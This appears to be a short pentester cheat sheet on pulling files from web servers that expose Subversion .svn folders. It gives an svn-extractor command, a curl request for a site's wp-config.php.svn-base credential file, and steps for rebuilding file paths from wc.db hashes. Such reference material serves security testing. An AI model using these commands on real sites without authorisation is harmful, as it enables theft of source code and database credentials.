# Subversion

> Subversion  (often abbreviated as SVN) is a centralized version control system (VCS) that has been widely used in the software development industry. Originally developed by CollabNet Inc. in 2000, Subversion was designed to be an improved version of CVS (Concurrent Versions System) and has since gained significant traction for its robustness and reliability. 

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [References](#references)

## Tools

* [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - Simple script to extract all web resources by means of .SVN folder exposed over network. 
    ```powershell
    python svn-extractor.py --url "url with .svn available"
    ```

## Methodology

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db
    ```powershell
    INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
    ```
    
2. Download interesting files
    * remove `$sha1$` prefix
    * add `.svn-base` postfix
    * use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)
    * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`

## References

- [SVN Extractor for Web Pentesters - Anant Shrivastava - March 26, 2013](http://blog.anantshri.info/svn-extractor-for-web-pentesters/)